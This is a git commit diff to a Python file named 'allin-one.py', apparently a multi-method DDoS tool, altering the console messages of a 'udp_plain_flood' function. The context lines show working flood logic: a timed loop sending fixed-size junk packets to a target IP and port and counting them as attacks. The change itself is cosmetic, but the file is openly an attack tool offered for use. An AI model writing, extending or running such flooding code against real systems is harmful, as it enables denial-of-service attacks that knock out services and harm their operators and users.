e222764314d737800694b5039203b81c47e742e6
termul488-ai <termul488@gmail.com>
2026-07-19 01:13:36 +0700

    Update allin-one.py

--- allin-one.py
+++ allin-one.py
@@ -31,11 +31,11 @@ def udp_plain_flood(ip, port, duration, packet_size):
     end_time = time.time() + duration
     packet_count = 0
     payload = b"A" * packet_size  # Fixed payloaf    
-    print(f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
+    print(f"⚡ Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print(f"[*]\033[32m Starting UDP Plain flood on\033[36m {ip}\033[37m:\033[33m{port} \033[38;5;39m num-attack {packet_count}.")
+            print(f"[*]\033[32m Starting UDP Plain flood on\033[36m {ip}\033[37m:\033[33m{port} \033[38;5;39m num-attack {packet_count}.\033[0m")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
